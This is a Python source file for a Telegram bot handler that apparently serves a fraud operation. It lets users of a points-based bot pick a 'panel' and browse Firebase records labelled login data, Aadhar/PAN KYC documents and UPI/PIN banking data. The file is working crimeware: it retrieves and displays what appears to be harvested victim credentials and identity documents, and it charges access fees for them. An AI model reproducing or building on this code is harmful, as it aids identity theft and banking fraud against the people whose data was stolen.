import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes, CallbackQueryHandler
from bot.services.firebase.fetch_vault import fetch_vault_data
from bot.middlewares.ban_check import ban_check
from bot.middlewares.points_check import points_required

logger = logging.getLogger(__name__)

@ban_check
async def vault_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Shows the Data Vault menu with options to view login, page2, page4, etc.
    """
    query = update.callback_query
    await query.answer()
    
    active_panel = context.user_data.get("active_panel")
    if not active_panel:
        keyboard = [[InlineKeyboardButton("📋 My Panels", callback_data="my_panels")],
                    [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_menu")]]
        await query.edit_message_text(
            "⚠️ **No Active Panel!**\n\nYou must first select an active commanding panel from the menu.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
        
    keyboard = [
        [InlineKeyboardButton("👤 Login Data", callback_data="vault_login"),
         InlineKeyboardButton("📄 Page2 (Aadhar/PAN)", callback_data="vault_page2")],
        [InlineKeyboardButton("🏦 Page4 (UPI/PIN)", callback_data="vault_page4")],
        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_menu")]
    ]
    
    await query.edit_message_text(
        "🗄️ **Data Vault**\n\n"
        f"Active Panel: `{active_panel}`\n\n"
        "Select which data branch you want to inspect:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

@ban_check
@points_required("receive_sms")
async def vault_view_branch(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    branch_map = {
        "vault_login": ("login", "👤 Login Data"),
        "vault_page2": ("page2", "📄 KYC Documents"),
        "vault_page4": ("page4", "🏦 Banking/UPI Data")
    }
    
    branch_key, title = branch_map.get(query.data, ("login", "Data"))
    active_panel = context.user_data.get("active_panel")
    
    if not active_panel:
        await query.edit_message_text("Session expired. Go back.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_to_menu")]]))
        return
        
    await query.edit_message_text(f"⏳ Fetching `{branch_key}` branch from active panel...")
    
    user_id = query.from_user.id
    from bot.models.user_model import get_user, update_user_points
    from bot.models.settings_model import get_setting
    
    # Check Points
    cost = await get_setting("cost_receive_sms", 5)
    user_record = await get_user(user_id)
    is_vip = user_record.get('is_vip', False) if user_record else False
    
    if not is_vip:
        new_bal = await update_user_points(user_id, -cost)
        if new_bal is None:
            await query.edit_message_text(f"🚫 **Insufficient Points!** You need {cost} points to access the vault.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back Menu", callback_data="back_to_menu")]]))
            return

    data = await fetch_vault_data(active_panel, branch_key)
    
    if not data:
        if not is_vip:
            await update_user_points(user_id, cost)
        keyboard = [[InlineKeyboardButton("⬅️ Back to Vault", callback_data="data_vault")]]
        await query.edit_message_text(
            f"📭 **No data found in branch: `{branch_key}`**\n\nIt might be empty or the path differs.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
        
    text = f"**{title}**\nFound {len(data)} entries (Showing top 10):\n\n"
    
    # Process top 10 items
    counter = 0
    for key, info in list(data.items())[:10]:
        if not isinstance(info, dict):
            continue
            
        counter += 1
        text += f"🔹 **Entry: `{key[:8]}...`**\n"
        for k, v in info.items():
            if k not in ['webhookEvent'] and v: # skip massive webhook objects
                # Formatting lists if present
                if isinstance(v, list):
                    v = ", ".join(map(str, v))
                text += f"   • {k.capitalize()}: `{v}`\n"
        text += "\n"
        
    if counter == 0:
        text += "Entries were in unexpected format."
        
    if not is_vip:
        text += f"\n💳 Charged: **{cost} points**."
        
    keyboard = [[InlineKeyboardButton("⬅️ Back to Vault", callback_data="data_vault")]]
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error sending vault text (might be too long): {e}")
        await query.edit_message_text("⚠️ Acquired data is too large to display directly in a single message.", reply_markup=InlineKeyboardMarkup(keyboard))
